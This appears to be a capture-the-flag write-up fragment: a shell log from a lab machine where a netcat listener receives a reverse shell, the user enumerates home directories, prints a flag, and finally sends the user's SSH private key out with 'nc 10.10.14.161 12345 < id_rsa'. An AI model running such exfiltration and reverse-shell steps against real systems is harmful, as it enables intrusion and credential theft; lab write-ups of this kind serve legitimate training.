
![[Images/Pasted image 20240428114703.png]]

```sh
┌──(kali㉿kali)-[~/thm/usage]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.161] from (UNKNOWN) [10.10.11.18] 55290
Linux usage 5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 21:34:55 up 5 min,  0 users,  load average: 1.08, 0.43, 0.18
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(dash) gid=1000(dash) groups=1000(dash)
/bin/sh: 0: can´t access tty; job control turned off
$ pwd
/
$ ls -la
total 72
drwxr-xr-x  19 root root  4096 Apr  2 21:15 .
drwxr-xr-x  19 root root  4096 Apr  2 21:15 ..
lrwxrwxrwx   1 root root     7 Feb 17  2023 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Apr  2 20:20 boot
drwxr-xr-x  20 root root  3960 Apr 25 21:29 dev
drwxr-xr-x 114 root root  4096 Apr  8 12:21 etc
drwxr-xr-x   4 root root  4096 Aug 16  2023 home
lrwxrwxrwx   1 root root     7 Feb 17  2023 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Feb 17  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Feb 17  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Feb 17  2023 libx32 -> usr/libx32
drwx------   2 root root 16384 Aug  6  2023 lost+found
drwxr-xr-x   2 root root  4096 Apr  2 21:15 media
drwxr-xr-x   2 root root  4096 Feb 17  2023 mnt
drwxr-xr-x   2 root root  4096 Oct 26  2023 opt
dr-xr-xr-x 283 root root     0 Apr 25 21:29 proc
drwx------   7 root root  4096 Apr 25 21:29 root
drwxr-xr-x  30 root root   900 Apr 25 21:29 run
lrwxrwxrwx   1 root root     8 Feb 17  2023 sbin -> usr/sbin
drwxr-xr-x   6 root root  4096 Feb 17  2023 snap
drwxr-xr-x   2 root root  4096 Feb 17  2023 srv
dr-xr-xr-x  13 root root     0 Apr 25 21:29 sys
drwxrwxrwt  14 root root  4096 Apr 25 21:35 tmp
drwxr-xr-x  14 root root  4096 Feb 17  2023 usr
drwxr-xr-x  14 root root  4096 Apr  2 21:15 var
$ cd home
$ ls -la
total 16
drwxr-xr-x  4 root   root   4096 Aug 16  2023 .
drwxr-xr-x 19 root   root   4096 Apr  2 21:15 ..
drwxr-x---  6 dash   dash   4096 Apr 25 21:34 dash
drwxr-x---  4 xander xander 4096 Apr  2 20:25 xander
$ cd dash
$ ls -la
total 52
drwxr-x--- 6 dash dash 4096 Apr 25 21:34 .
drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root    9 Apr  2 20:22 .bash_history -> /dev/null
-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
drwx------ 3 dash dash 4096 Aug  7  2023 .cache
drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
-rw-r--r-- 1 dash dash    5 Apr 25 21:34 .monit.pid
-rw------- 1 dash dash 1192 Apr 25 21:35 .monit.state
-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
-rw-r----- 1 root dash   33 Apr 25 21:29 user.txt
$ cat user.txt
1e6ed0d51062d1faae71f72f147f6caa
$ cd .ssh
$ la -la
/bin/sh: 9: la: not found
$ ls -la
total 20
drwx------ 2 dash dash 4096 Aug 24  2023 .
drwxr-x--- 6 dash dash 4096 Apr 25 22:04 ..
-rw------- 1 dash dash  564 Aug 24  2023 authorized_keys
-rw------- 1 dash dash 2590 Aug 24  2023 id_rsa
-rw-r--r-- 1 dash dash  564 Aug 24  2023 id_rsa.pub
$ cd ..
$ cd ..
$ ls -la
total 16
drwxr-xr-x  4 root   root   4096 Aug 16  2023 .
drwxr-xr-x 19 root   root   4096 Apr  2 21:15 ..
drwxr-x---  6 dash   dash   4096 Apr 25 22:04 dash
drwxr-x---  5 xander xander 4096 Apr 25 21:55 xander
$ sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
$ 
$ ^?python3 -c 'import pty;pty.spawn("/bin/bash")'
/bin/sh: 16: python3: not found
$ which python
$ ls -la
total 16
drwxr-xr-x  4 root   root   4096 Aug 16  2023 .
drwxr-xr-x 19 root   root   4096 Apr  2 21:15 ..
drwxr-x---  6 dash   dash   4096 Apr 25 22:05 dash
drwxr-x---  5 xander xander 4096 Apr 25 21:55 xander
$ whoami
dash
$ cd dash
cd$  .ssh
$ ls -la
total 20
drwx------ 2 dash dash 4096 Aug 24  2023 .
drwxr-x--- 6 dash dash 4096 Apr 25 22:05 ..
-rw------- 1 dash dash  564 Aug 24  2023 authorized_keys
-rw------- 1 dash dash 2590 Aug 24  2023 id_rsa
-rw-r--r-- 1 dash dash  564 Aug 24  2023 id_rsa.pub
$ nc 10.10.14.161 12345 < id_rsa

```

found user.txt and id_rsa

